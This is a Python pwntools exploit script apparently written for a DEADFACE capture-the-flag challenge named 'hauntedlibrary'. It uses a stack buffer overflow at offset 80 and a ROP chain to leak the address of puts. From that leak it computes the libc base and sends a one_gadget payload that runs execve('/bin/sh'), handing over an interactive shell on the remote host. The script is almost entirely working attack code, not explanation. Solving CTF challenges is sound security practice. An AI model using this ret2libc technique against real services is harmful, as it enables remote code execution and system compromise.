#!/usr/bin/env python3

from pwn import *

e = ELF("./hauntedlibrary_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "env02.deadface.io"  # Remote host IP
PORT = 7832  # Remote port

gdb_script = """
b main
b book_of_the_dead
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target
    ret = 0x000000000040101a
    offset = 80  # Offset to control return address
    payload = flat({offset: [
            ret,        # Stack alignment
            0x0040174f, # There is a function to leak puts

                        # [0x00401140]> pdg @ sym.book_of_the_dead
                        #
                        # void sym.book_of_the_dead(void)
                        #
                        # {
                        #     ulong uVar1;
                        #     
                        #     fcn.00401130(0x40a411);
                        #     uVar1 = _reloc.puts;
                        #     fcn.00401130("....");
                        #     fcn.00401130("You pick up the dusty old tome, covered with bloody runes and a face on the cover...");
                        #     sym.imp.printf("the face whispers to you:  puts(): %p",uVar1);
                        #     return;
                        # }

            0x00401631  # return to input BoF
        ]})  # Flatten payload for sending

    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>', payload)
    p.recvuntil(b'to you:  puts(): ')
    puts = int(p.recvline().strip(b'\n'), 16)
    libc_address = puts - libc.symbols['puts']
    
    one_gadget = libc_address + 0xe5ff0
    # 0xe5ff0 execve("/bin/sh", r9, r10)
    # constraints:
    #   [r9] == NULL || r9 == NULL || r9 is a valid argv
    #   [r10] == NULL || r10 == NULL || r10 is a valid envp

    payload = flat({offset: [
            ret, # Stack alignment
            one_gadget,
        ]})  # Flatten payload for sending
    
    p.sendlineafter(b'>', payload)
    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

